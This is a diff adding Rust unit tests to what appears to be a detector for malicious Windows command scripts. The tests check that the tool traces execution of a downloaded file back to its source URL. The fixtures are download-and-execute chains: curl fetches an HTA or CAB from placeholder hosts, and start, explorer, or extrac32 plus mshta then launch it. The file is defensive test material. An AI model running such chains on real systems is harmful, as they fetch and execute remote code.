@@ -2296,6 +2296,27 @@ start .\payload.hta"#,
     }
 
     #[test]
+    fn start_slash_equivalent_local_target_resolves_prior_download_source_url() {
+        let report = analyze(
+            br#"curl -o C:\Temp\payload.hta https://start-slash-source.example/payload.hta
+start C:/Temp/payload.hta"#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "start C:/Temp/payload.hta"
+                            && url == "https://start-slash-source.example/payload.hta"
+                )
+            }),
+            "start slash-equivalent local target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn local_launcher_url_arguments_keep_command_provenance() {
         let report = analyze(
             br#"curl -o payload.hta https://local-provenance.example/payload.hta
@@ -7684,6 +7705,27 @@ explorer .\payload.hta"#,
                 )
             }),
             "Explorer current-directory target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn explorer_slash_equivalent_local_target_resolves_prior_download_source_url() {
+        let report = crate::analyze(
+            br#"curl -o C:\Temp\payload.hta https://explorer-slash-source.example/payload.hta
+explorer C:/Temp/payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "explorer C:/Temp/payload.hta"
+                            && url == "https://explorer-slash-source.example/payload.hta"
+                )
+            }),
+            "Explorer slash-equivalent target did not resolve prior download source: {:?}",
             report.traits
         );
     }
@@ -19149,6 +19191,51 @@ mshta dropped.hta"#,
                 .any(|t| matches!(t, Trait::Lolbas { name, .. } if name == "expand")),
             "expand LOLBAS provenance missing: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn extrac32_slash_equivalent_source_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o C:\Temp\payload.cab https://extrac32-slash-source.example/payload.cab
+extrac32 /y C:/Temp/payload.cab dropped.hta
+mshta dropped.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta dropped.hta"
+                            && url == "https://extrac32-slash-source.example/payload.cab"
+                )
+            }),
+            "extrac32 slash-equivalent source artifact was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn extrac32_slash_equivalent_source_tracks_download_entry() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            r#"c:\temp\payload.cab"#.to_string(),
+            crate::env::FsEntry::Download {
+                src: "https://extrac32-slash-entry.example/payload.cab".to_string(),
+            },
+        );
+
+        crate::interp::interpret_line("extrac32 /y C:/Temp/payload.cab dropped.hta", &mut env);
+
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dropped.hta"),
+                Some(crate::env::FsEntry::Download { src })
+                    if src == "https://extrac32-slash-entry.example/payload.cab"
+            ),
+            "extrac32 slash-equivalent source did not preserve download entry: {:?}",
+            env.modified_filesystem.get("dropped.hta")
         );
     }
 
